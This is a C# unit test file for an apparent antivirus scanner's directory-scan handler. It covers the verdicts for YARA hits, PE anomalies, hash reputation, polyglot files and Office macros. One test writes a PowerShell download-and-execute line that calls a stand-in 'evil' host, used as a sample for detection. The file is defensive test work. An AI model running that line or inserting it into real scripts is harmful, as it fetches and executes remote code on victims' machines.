using FluentAssertions;
using NSubstitute;
using PerSourceAntivirus.Application.Common.Interfaces;
using PerSourceAntivirus.Application.Scans;
using PerSourceAntivirus.Application.Scans.Commands.ScanDirectory;
using PerSourceAntivirus.Domain.Entities;
using PerSourceAntivirus.Domain.Enums;
using MediatR;

namespace PerSourceAntivirus.Application.Tests.Scans.Commands;

public class ScanDirectoryCommandHandlerTests
{
    private static ScanDirectoryCommandHandler BuildHandler(
        IFileHashCalculator? hashCalculator = null,
        IYaraScanner? yaraScanner = null,
        IPeAnalyzer? peAnalyzer = null,
        IScriptAnalyzer? scriptAnalyzer = null,
        IExclusionList? exclusionList = null,
        IScannedFileRepository? repository = null,
        IHashReputationService? reputationService = null,
        IFileMetadataAnalyzer? metadataAnalyzer = null,
        IOfficeMacroAnalyzer? macroAnalyzer = null,
        int maxParallelism = 1)
    {
        hashCalculator    ??= Substitute.For<IFileHashCalculator>();
        yaraScanner       ??= Substitute.For<IYaraScanner>();
        peAnalyzer        ??= Substitute.For<IPeAnalyzer>();
        scriptAnalyzer    ??= Substitute.For<IScriptAnalyzer>();
        exclusionList     ??= Substitute.For<IExclusionList>();
        repository        ??= Substitute.For<IScannedFileRepository>();
        reputationService ??= Substitute.For<IHashReputationService>();
        metadataAnalyzer  ??= Substitute.For<IFileMetadataAnalyzer>();
        macroAnalyzer     ??= Substitute.For<IOfficeMacroAnalyzer>();

        var fileScanService = new FileScanService(
            hashCalculator, yaraScanner, peAnalyzer, scriptAnalyzer,
            exclusionList, repository, reputationService,
            metadataAnalyzer, macroAnalyzer);
        return new ScanDirectoryCommandHandler(fileScanService, new ScanSettings(maxParallelism));
    }

    [Fact]
    public async Task Handle_ScansAllFilesInDirectory_AndPersistsResults()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "a.txt"), "a");
            await File.WriteAllTextAsync(Path.Combine(rootPath, "b.txt"), "b");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("deadbeef", 1.0, 1));

            var repository = Substitute.For<IScannedFileRepository>();

            var handler = BuildHandler(hashCalculator, repository: repository);
            var result = await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            result.FilesScanned.Should().Be(2);
            await repository.Received(2).AddAsync(Arg.Any<ScannedFile>(), Arg.Any<CancellationToken>());
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_ScansSingleFile_WhenPathIsAFile()
    {
        var file = Path.GetTempFileName();
        try
        {
            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("aabbcc", 1.0, 5));

            var repository = Substitute.For<IScannedFileRepository>();
            var handler = BuildHandler(hashCalculator, repository: repository);

            var result = await handler.Handle(new ScanDirectoryCommand(file), CancellationToken.None);

            result.FilesScanned.Should().Be(1);
            await repository.Received(1).AddAsync(Arg.Any<ScannedFile>(), Arg.Any<CancellationToken>());
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Fact]
    public async Task Handle_SkipsExcludedFiles_BasedOnExclusionList()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "good.txt"), "ok");
            await File.WriteAllTextAsync(Path.Combine(rootPath, "bad.log"), "noise");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("ccddee", 1.0, 2));

            var exclusionList = Substitute.For<IExclusionList>();
            exclusionList.IsExcludedFile(Arg.Is<string>(p => p.EndsWith(".log"))).Returns(true);
            exclusionList.IsExcludedFile(Arg.Is<string>(p => !p.EndsWith(".log"))).Returns(false);

            var repository = Substitute.For<IScannedFileRepository>();
            var handler = BuildHandler(hashCalculator, exclusionList: exclusionList, repository: repository);

            var result = await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            result.FilesScanned.Should().Be(1);
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_MarksWhitelistedFiles_AsClean()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "trusted.exe"), "trusted");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("trustedhash", 2.0, 7));

            var exclusionList = Substitute.For<IExclusionList>();
            exclusionList.IsWhitelistedHash("trustedhash").Returns(true);

            var yaraScanner = Substitute.For<IYaraScanner>();
            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, exclusionList: exclusionList, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted.Should().NotBeNull();
            persisted!.ThreatStatus.Should().Be(ThreatStatus.Clean);
            yaraScanner.DidNotReceive().ScanFile(Arg.Any<string>());
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SkipsFiles_WhenHashCalculatorThrowsIOException()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "locked.txt"), "x");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(Task.FromException<FileHashResult>(new IOException("locked")));

            var repository = Substitute.For<IScannedFileRepository>();
            var handler = BuildHandler(hashCalculator, repository: repository);

            var result = await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            result.FilesScanned.Should().Be(0);
            await repository.DidNotReceive().AddAsync(Arg.Any<ScannedFile>(), Arg.Any<CancellationToken>());
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SetsThreatStatusMalicious_WhenYaraMatchTaggedMalicious()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "evil.exe"), "X5O!P");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("aabbccdd", 2.0, 5));

            var yaraScanner = Substitute.For<IYaraScanner>();
            yaraScanner.ScanFile(Arg.Any<string>())
                .Returns([new YaraRuleMatch("EICAR_Test_File", ["malicious"])]);

            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, yaraScanner, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted.Should().NotBeNull();
            persisted!.ThreatStatus.Should().Be(ThreatStatus.Malicious);
            persisted.YaraMatches.Should().ContainSingle(m => m.RuleIdentifier == "EICAR_Test_File");
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SetsThreatStatusSuspicious_WhenPeAnomaliesDetected()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "packed.dll"), "MZ");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("cafebabe", 7.8, 2));

            var yaraScanner = Substitute.For<IYaraScanner>();
            yaraScanner.ScanFile(Arg.Any<string>()).Returns([]);

            var peAnalyzer = Substitute.For<IPeAnalyzer>();
            peAnalyzer.Analyze(Arg.Any<string>()).Returns(new PeAnalysisData(
                Is64Bit: true, IsDll: true, IsDotNet: false, IsSigned: false,
                Sections: [new PeSectionData(".text", 4096, 7.9)],
                SuspiciousImports: [],
                Anomalies: ["HighEntropySection"]));

            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, yaraScanner, peAnalyzer, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted.Should().NotBeNull();
            persisted!.ThreatStatus.Should().Be(ThreatStatus.Suspicious);
            persisted.PeAnalysis!.Anomalies.Should().Contain("HighEntropySection");
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SetsThreatStatusSuspicious_WhenScriptHasSuspiciousPatterns()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "dropper.ps1"),
                "IEX (New-Object Net.WebClient).DownloadString('http://evil/payload')");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("baddeed", 3.5, 80));

            var scriptAnalyzer = Substitute.For<IScriptAnalyzer>();
            scriptAnalyzer.Analyze(Arg.Any<string>()).Returns(new ScriptAnalysisData(
                ScriptType: Domain.Enums.ScriptType.PowerShell,
                HasObfuscation: true, HasNetworkAccess: true,
                HasProcessExecution: false, HasFileSystemAccess: false,
                SuspiciousPatterns: ["IEX/Invoke-Expression", "Network download"]));

            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, scriptAnalyzer: scriptAnalyzer, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted.Should().NotBeNull();
            persisted!.ThreatStatus.Should().Be(ThreatStatus.Suspicious);
            persisted.ScriptAnalysis.Should().NotBeNull();
            persisted.ScriptAnalysis!.HasNetworkAccess.Should().BeTrue();
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SetsThreatStatusMalicious_WhenReputationFlagsHash()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "known-bad.exe"), "malicious");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("badhash123", 5.0, 10));

            var reputationService = Substitute.For<IHashReputationService>();
            reputationService.CheckAsync("badhash123", Arg.Any<CancellationToken>())
                .Returns(new HashReputationData(10, 72, true, "LocalList", null));

            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, reputationService: reputationService, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted.Should().NotBeNull();
            persisted!.ThreatStatus.Should().Be(ThreatStatus.Malicious);
            persisted.HashReputation.Should().NotBeNull();
            persisted.HashReputation!.Source.Should().Be("LocalList");
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SkipsUnchangedFiles_WhenIncrementalHashMatches()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "file.txt"), "content");
            var filePath = Path.Combine(rootPath, "file.txt");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("samehash", 2.0, 7));

            var repository = Substitute.For<IScannedFileRepository>();
            // Report same hash as existing scan → incremental skip.
            repository.GetExistingHashesAsync(Arg.Any<IEnumerable<string>>(), Arg.Any<CancellationToken>())
                .Returns((IReadOnlyDictionary<string, string>)new Dictionary<string, string> { [filePath] = "samehash" });

            var handler = BuildHandler(hashCalculator, repository: repository);
            var result = await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            result.FilesScanned.Should().Be(0);
            await repository.DidNotReceive().AddAsync(Arg.Any<ScannedFile>(), Arg.Any<CancellationToken>());
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SetsThreatStatusClean_WhenNoMatchesOrAnomalies()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "clean.txt"), "hello");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("112233", 3.2, 5));

            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted!.ThreatStatus.Should().Be(ThreatStatus.Clean);
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SetsThreatStatusSuspicious_WhenFileMetadataIsPolyglot()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "hidden.jpg"), "fake image");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("deadbeef01", 4.0, 10));

            var metadataAnalyzer = Substitute.For<IFileMetadataAnalyzer>();
            metadataAnalyzer.Analyze(Arg.Any<string>())
                .Returns(new FileMetadataData(null, null, null, null,
                    HasEmbeddedFiles: false, HasJavaScript: false, IsPolyglot: true,
                    Anomalies: ["EmbeddedSignature:ZIP"]));

            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, metadataAnalyzer: metadataAnalyzer, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted!.ThreatStatus.Should().Be(ThreatStatus.Suspicious);
            persisted.FileMetadata.Should().NotBeNull();
            persisted.FileMetadata!.IsPolyglot.Should().BeTrue();
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }

    [Fact]
    public async Task Handle_SetsThreatStatusMalicious_WhenMacroHasAutoExecAndNetworkAccess()
    {
        var rootPath = Directory.CreateTempSubdirectory().FullName;
        try
        {
            await File.WriteAllTextAsync(Path.Combine(rootPath, "dropper.docm"), "fake macro doc");

            var hashCalculator = Substitute.For<IFileHashCalculator>();
            hashCalculator.ComputeAsync(Arg.Any<string>(), Arg.Any<CancellationToken>())
                .Returns(new FileHashResult("macrobad01", 5.0, 14));

            var macroAnalyzer = Substitute.For<IOfficeMacroAnalyzer>();
            macroAnalyzer.Analyze(Arg.Any<string>())
                .Returns(new OfficeMacroData(
                    HasMacros: true, HasAutoExec: true,
                    HasNetworkAccess: true, HasProcessExecution: false,
                    HasObfuscation: false,
                    SuspiciousPatterns: ["AutoExec trigger", "Network access"]));

            ScannedFile? persisted = null;
            var repository = Substitute.For<IScannedFileRepository>();
            await repository.AddAsync(Arg.Do<ScannedFile>(f => persisted = f), Arg.Any<CancellationToken>());

            var handler = BuildHandler(hashCalculator, macroAnalyzer: macroAnalyzer, repository: repository);
            await handler.Handle(new ScanDirectoryCommand(rootPath), CancellationToken.None);

            persisted!.ThreatStatus.Should().Be(ThreatStatus.Malicious);
            persisted.OfficeMacro.Should().NotBeNull();
            persisted.OfficeMacro!.HasAutoExec.Should().BeTrue();
            persisted.OfficeMacro.HasNetworkAccess.Should().BeTrue();
        }
        finally
        {
            Directory.Delete(rootPath, recursive: true);
        }
    }
}
